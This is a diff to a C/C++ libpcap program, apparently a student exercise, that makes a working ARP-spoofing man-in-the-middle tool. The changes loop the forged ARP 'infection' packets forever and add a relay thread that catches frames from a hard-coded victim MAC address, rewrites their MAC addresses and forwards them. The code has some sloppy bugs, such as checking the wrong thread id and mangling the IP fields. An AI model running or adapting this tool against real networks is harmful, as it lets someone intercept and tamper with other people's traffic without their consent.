@@ -3,6 +3,8 @@
 #include <stdio.h>
 #include <string.h>
 #include <pthread.h>
+#include <iostream>
+using namespace std;
 
 struct libnet_arp_hdr_Saewook
 {
@@ -45,6 +47,8 @@ typedef struct tTHREAD
     pcap_t *handle; /* Session handle */
     u_char *send_buf;
     int size;
+    u_char *relay_buf;
+
 }THREAD;
 
 void *infect(void *data)
@@ -52,16 +56,62 @@ void *infect(void *data)
     THREAD* PP = (THREAD*)data;
     pcap_t *handle = PP -> handle;
     u_char *send_buf =  PP -> send_buf;
-    int i;
-    for(i = 0; i < 5; i++)
-    {
-    pcap_sendpacket(handle, (u_char*)send_buf, (sizeof(libnet_ethernet_hdr) + sizeof(libnet_arp_hdr_Saewook)));
-    sleep(1);
-    }
+    int size = PP -> size;
 
-    printf("The End of Infect packet");
+    while(1)
+    {
+        pcap_sendpacket(handle, (u_char*)send_buf, size);
+        printf("Sending infection packet..!!\n");
+        sleep(1);
+    }
     return 0;
 }
+
+
+void *relay(void *data)
+{
+    THREAD* PP = (THREAD*)data;
+    pcap_t *handle = PP -> handle;
+    u_char *send_relay_buf = PP -> relay_buf;
+
+    while(1)
+    {
+        struct pcap_pkthdr *relay;
+        const u_char * packet;
+        int res = pcap_next_ex(handle, &relay, &packet);
+        if(res == 0){printf("No packet is sniffed..!!");break;}
+        if(res == -1) break;
+
+        struct libnet_ethernet_hdr *new_ehP = (struct libnet_ethernet_hdr *)packet;
+        if(
+           (new_ehP -> ether_shost[0] == 0x00) &&
+           (new_ehP -> ether_shost[1] == 0x0c) &&
+           (new_ehP -> ether_shost[2] == 0x29) &&
+           (new_ehP -> ether_shost[3] == 0x02) &&
+           (new_ehP -> ether_shost[4] == 0xFF) &&
+           (new_ehP -> ether_shost[5] == 0x0c))
+        
+        {
+            new_ehP -> ether_dhost[0] = 0x00;
+            new_ehP -> ether_dhost[1] = 0x50;
+            new_ehP -> ether_dhost[2] = 0x56;
+            new_ehP -> ether_dhost[3] = 0xf2;
+            new_ehP -> ether_dhost[4] = 0x60;
+            new_ehP -> ether_dhost[5] = 0x7f;
+
+            new_ehP -> ether_shost[0] = 0x00;
+            new_ehP -> ether_shost[1] = 0x0c;
+            new_ehP -> ether_shost[2] = 0x29;
+            new_ehP -> ether_shost[3] = 0xe1;
+            new_ehP -> ether_shost[4] = 0xAA;
+            new_ehP -> ether_shost[5] = 0x9A;
+
+            pcap_sendpacket(handle, (u_char*)packet, relay->len);
+        }
+    }
+    return 0;
+}
+
 
 int main(int argc, char **argv)
 
@@ -96,7 +146,7 @@ int main(int argc, char **argv)
       //requset place
 
       // eth_hdr setting place
-      // Destination Mac address
+      // broadcast send packet
 
       send_buf[0] = 0xFF;
       send_buf[1] = 0xFF;
@@ -113,7 +163,9 @@ int main(int argc, char **argv)
       send_buf[10] = 0xaa;
       send_buf[11] = 0x9a;
 
-      eth_hdr -> ether_type = htons(ETHERTYPE_ARP); // send_buf[12] = 0x08, send_buf[13] = 0x06)
+      eth_hdr -> ether_type = htons(ETHERTYPE_ARP); //send packet
+
+      //
 
       libnet_arp_hdr_Saewook* arp_hdr = (libnet_arp_hdr_Saewook*)(send_buf + sizeof(libnet_ethernet_hdr));
           arp_hdr -> ar_hrd = htons(ARPHRD_ETHER); // send_buf[14] = 0x00, send_buf[15] = 0x01
@@ -123,6 +175,7 @@ int main(int argc, char **argv)
           arp_hdr -> ar_op = htons(ARPOP_REQUEST); //send_buf[20] = 0x01, send_buf[21] = 0x00
 
           arp_hdr -> sender_HA[0] = send_buf[6]; //send_buf[22]
+
           arp_hdr -> sender_HA[1] = send_buf[7]; //send_buf[23]
           arp_hdr -> sender_HA[2] = send_buf[8]; //send_buf[24]
           arp_hdr -> sender_HA[3] = send_buf[9]; //send_buf[25]
@@ -131,10 +184,8 @@ int main(int argc, char **argv)
 
           //printf("%02X", htonl(inet_addr(argv[1]))); // dec -> hex;
 
-
           uint32_t sdr_ip_hex;
-          sdr_ip_hex = htonl(inet_addr(argv[1]));
-          printf("%X\n", sdr_ip_hex); //send_buf[28, 29, 30, 31]
+           sdr_ip_hex = htonl(inet_addr(argv[1]));
 
           arp_hdr -> sender_ip[0] = htonl(sdr_ip_hex);
           arp_hdr -> sender_ip[1] = htons(sdr_ip_hex);
@@ -144,11 +195,10 @@ int main(int argc, char **argv)
           arp_hdr -> target_HA[2] = 0x00; //send_buf[34]
           arp_hdr -> target_HA[3] = 0x00; //send_buf[35]
           arp_hdr -> target_HA[4] = 0x00; //send_buf[36]
-          arp_hdr -> target_HA[5] = 0x00; //se  nd_buf[37]
+          arp_hdr -> target_HA[5] = 0x00; //send_buf[37]
 
           uint32_t dst_ip_hex;
           dst_ip_hex = htonl(inet_addr(argv[2]));
-          printf("%X\n", dst_ip_hex);
 
           arp_hdr -> target_ip[0] = htonl(dst_ip_hex);
           arp_hdr -> target_ip[1] = htons(dst_ip_hex);
@@ -160,8 +210,10 @@ int main(int argc, char **argv)
           struct pcap_pkthdr *h;
           const u_char * p;
           int res = pcap_next_ex(handle, &h, &p);
-          //if(res == 0){printf("No packet is sniffed..!!");break;}
-          //if(res == -1) break;
+          if(res == 0){printf("No packet is sniffed..!!");exit(0);}
+          if(res == -1) exit(0);
+
+
 
           struct libnet_ethernet_hdr *ehP = (struct libnet_ethernet_hdr *)p;
           send_buf[0] = ehP->ether_shost[0];
@@ -177,7 +229,6 @@ int main(int argc, char **argv)
           send_buf[9] = ehP->ether_dhost[3];
           send_buf[10] = ehP->ether_dhost[4];
           send_buf[11] = ehP->ether_dhost[5];
-
 
           struct libnet_arp_hdr_Saewook *ARP;
           ARP = (struct libnet_arp_hdr_Saewook*)(p + sizeof(*ehP));
@@ -197,17 +248,19 @@ int main(int argc, char **argv)
           arp_hdr -> target_HA[4] = ARP -> sender_HA[4];
           arp_hdr -> target_HA[5] = ARP -> sender_HA[5];
 
-          //-- reply packet to gateway --//
-
-
           pthread_t thread_t[2];
           THREAD st;
+
+          //infection packet thread
           st.handle = handle;
           st.send_buf = (u_char*)send_buf;
           st.size = (sizeof(libnet_ethernet_hdr) + sizeof(libnet_arp_hdr_Saewook));
 
-          int status;
+          //relay packet thread
+
+
           int tid;
+          int tid2;
 
           tid = pthread_create(&thread_t[0], NULL, infect, (void *)&st);
           if(tid < 0)
@@ -215,28 +268,25 @@ int main(int argc, char **argv)
               printf("Can't Create Thread...!!");
               exit(0);
           }
-          pthread_join(thread_t[0], (void **)&status);
 
-          printf("\n                  ** eth0 **\n");
-          printf("      Source MAC     ->  Destination MAC\n");
-          printf("   %02X:%02X:%02X:%02X:%02X:%02X -> %02X:%02X:%02X:%02X:%02X:%02X\n\n\n",
-                                                ehP->ether_shost[0],
-                                                ehP->ether_shost[1],
-                                                ehP->ether_shost[2],
-                                                ehP->ether_shost[3],
-                                                ehP->ether_shost[4],
-                                                ehP->ether_shost[5],
-                                                ehP->ether_dhost[0],
-                                                ehP->ether_dhost[1],
-                                                ehP->ether_dhost[2],
-                                                ehP->ether_dhost[3],
-                                                ehP->ether_dhost[4],
-                                                ehP->ether_dhost[5]);
 
-          //tid = pthread_create(&thread_t[1], NULL, reply, (void *)&st);
-          //pthread_join(thread_t[1], (void **)&status);
+          tid2 = pthread_create(&thread_t[1], NULL, relay, (void *)&st);
+          if(tid < 0)
+          {
+              printf("Can't Create Thread...!!");
+              exit(0);
+          }
+
+          int a;
+
+          while(1)
+          {
+          cin>>a;
+          if( a == 0 ) break;
+          }
           return 0;
-
 }
+
+
 
 
